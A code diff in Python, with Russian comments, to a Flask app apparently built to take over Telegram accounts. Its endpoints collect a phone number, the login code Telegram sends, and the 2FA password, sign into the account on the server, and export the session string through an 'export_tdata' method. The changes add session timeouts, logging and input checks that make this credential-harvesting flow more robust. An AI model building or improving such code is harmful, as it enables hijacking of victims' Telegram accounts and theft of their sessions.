@@ -262,7 +262,29 @@ def load_api_keys():
 API_ID, API_HASH, SECRET_KEY = load_api_keys()
 app.secret_key = SECRET_KEY
 
+# 🔧 ИСПРАВЛЯЕМ ХРАНЕНИЕ СЕССИЙ - ДЕЛАЕМ ЕГО УСТОЙЧИВЫМ
 ACTIVE_SESSIONS = {}
+SESSION_TIMEOUT = 300  # 5 минут
+
+def cleanup_expired_sessions():
+    """Очистка просроченных сессий"""
+    current_time = time.time()
+    expired_sessions = []
+    
+    for session_id, session_data in ACTIVE_SESSIONS.items():
+        if current_time - session_data['created_at'] > SESSION_TIMEOUT:
+            expired_sessions.append(session_id)
+    
+    for session_id in expired_sessions:
+        if session_id in ACTIVE_SESSIONS:
+            try:
+                client = ACTIVE_SESSIONS[session_id].get('client')
+                if client:
+                    asyncio.create_task(client.disconnect())
+            except:
+                pass
+            del ACTIVE_SESSIONS[session_id]
+            logger.info(f"🗑️ Удалена просроченная сессия: {session_id}")
 
 class TelegramAuthTester:
     def __init__(self):
@@ -310,14 +332,17 @@ class TelegramAuthTester:
             logger.info(f"📱 Запрос кода для: {phone_number}")
             sent_code = await client.send_code(phone_number)
             
+            # 🔧 СОХРАНЯЕМ СЕССИЮ С ОБНОВЛЕННЫМИ ДАННЫМИ
             ACTIVE_SESSIONS[session_id] = {
                 'client': client,
                 'phone': phone_number,
                 'phone_code_hash': sent_code.phone_code_hash,
-                'created_at': time.time()
+                'created_at': time.time(),
+                'needs_password': False  # Добавляем флаг для 2FA
             }
             
             logger.info(f"📱 Код отправлен. Session: {session_id}")
+            logger.info(f"📊 Активных сессий: {len(ACTIVE_SESSIONS)}")
             
             return {
                 'success': True,
@@ -335,7 +360,12 @@ class TelegramAuthTester:
             return {'success': False, 'error': f'Ошибка: {str(e)}'}
     
     async def verify_code(self, session_id, code):
+        # 🔧 ДОБАВЛЯЕМ ОЧИСТКУ ПРОСРОЧЕННЫХ СЕССИЙ ПЕРЕД ПРОВЕРКОЙ
+        cleanup_expired_sessions()
+        
         if session_id not in ACTIVE_SESSIONS:
+            logger.error(f"❌ Сессия не найдена: {session_id}")
+            logger.info(f"📊 Доступные сессии: {list(ACTIVE_SESSIONS.keys())}")
             return {'success': False, 'error': 'Сессия не найдена или истекла'}
             
         session_data = ACTIVE_SESSIONS[session_id]
@@ -380,8 +410,11 @@ class TelegramAuthTester:
                 
         except SessionPasswordNeeded:
             logger.info("🔒 Требуется 2FA пароль")
+            # 🔧 ОБНОВЛЯЕМ СЕССИЮ С ФЛАГОМ 2FA
             session_data['needs_password'] = True
             ACTIVE_SESSIONS[session_id] = session_data
+            
+            logger.info(f"🔐 Сессия {session_id} переведена в режим 2FA")
             
             return {
                 'success': True,
@@ -397,13 +430,15 @@ class TelegramAuthTester:
         except PhoneCodeExpired as e:
             logger.warning(f"⏰ Код истек: {e}")
             await client.disconnect()
-            del ACTIVE_SESSIONS[session_id]
+            if session_id in ACTIVE_SESSIONS:
+                del ACTIVE_SESSIONS[session_id]
             return {'success': False, 'error': 'Код истек. Запросите новый.'}
             
         except FloodWait as e:
             logger.warning(f"⏳ Flood wait: {e.value} секунд")
             await client.disconnect()
-            del ACTIVE_SESSIONS[session_id]
+            if session_id in ACTIVE_SESSIONS:
+                del ACTIVE_SESSIONS[session_id]
             return {
                 'success': False, 
                 'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
@@ -420,11 +455,19 @@ class TelegramAuthTester:
             return {'success': False, 'error': f'Ошибка: {str(e)}'}
     
     async def verify_password(self, session_id, password):
+        # 🔧 ДОБАВЛЯЕМ ОЧИСТКУ ПРОСРОЧЕННЫХ СЕССИЙ
+        cleanup_expired_sessions()
+        
         if session_id not in ACTIVE_SESSIONS:
+            logger.error(f"❌ Сессия не найдена для 2FA: {session_id}")
+            logger.info(f"📊 Доступные сессии: {list(ACTIVE_SESSIONS.keys())}")
             return {'success': False, 'error': 'Сессия не найдена'}
             
         session_data = ACTIVE_SESSIONS[session_id]
+        
+        # 🔧 ПРОВЕРЯЕМ ЧТО СЕССИЯ В РЕЖИМЕ 2FA
         if not session_data.get('needs_password'):
+            logger.error(f"❌ Неверный статус сессии для 2FA: {session_id}")
             return {'success': False, 'error': 'Неверный статус сессии'}
             
         client = session_data['client']
@@ -470,7 +513,6 @@ class TelegramAuthTester:
                 del ACTIVE_SESSIONS[session_id]
             return {'success': False, 'error': 'Неверный пароль 2FA'}
     
-    # 🔧 ДОБАВЛЯЕМ ОТСУТСТВУЮЩИЙ МЕТОД export_tdata
     async def export_tdata(self, client, user_info, request_info=None):
         try:
             session_string = await client.export_session_string()
@@ -608,9 +650,13 @@ def verify_code():
             return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
             
         session_id = data.get('session_id', '').strip()
+        
+        if not session_id:
+            return jsonify({'success': False, 'error': 'Session ID required'}), 400
+            
         code = data.get('code', '').strip()
         
-        if not session_id or not code:
+        if not code:
             return jsonify({'success': False, 'error': 'Введите код'}), 400
         
         result = async_runner.run_coroutine(auth_tester.verify_code(session_id, code))
@@ -631,9 +677,13 @@ def verify_password():
             return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
             
         session_id = data.get('session_id', '').strip()
+        
+        if not session_id:
+            return jsonify({'success': False, 'error': 'Session ID required'}), 400
+            
         password = data.get('password', '')
         
-        if not session_id or not password:
+        if not password:
             return jsonify({'success': False, 'error': 'Введите пароль'}), 400
         
         result = async_runner.run_coroutine(auth_tester.verify_password(session_id, password))
